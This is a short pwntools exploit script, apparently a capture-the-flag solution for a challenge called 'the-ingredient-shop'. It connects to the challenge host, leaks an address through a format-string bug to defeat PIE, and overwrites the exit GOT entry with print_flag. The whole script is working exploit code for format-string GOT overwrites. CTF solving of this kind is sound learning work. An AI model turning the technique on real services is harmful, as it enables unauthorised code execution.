#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./shop")
context.binary = exe

# io = gdb.debug(exe.path, '')
io = process('ncat --ssl the-ingredient-shop-134ad2f55ba78e9f.challs.brunnerne.xyz 443'.split())
io.sendlineafter(b'exit\n', b'%43$p')
io.recvuntil(b'here is your choice\n')
exe.address = int(io.recvline().strip(), 16)-0x1351
print(hex(exe.got.exit), hex(exe.sym.print_flag))

payload = fmtstr_payload(8, writes={
    exe.got.exit : p64(exe.sym.print_flag)
})

io.sendlineafter(b'exit\n', payload)
io.sendlineafter(b'exit\n', b'3')

io.interactive()
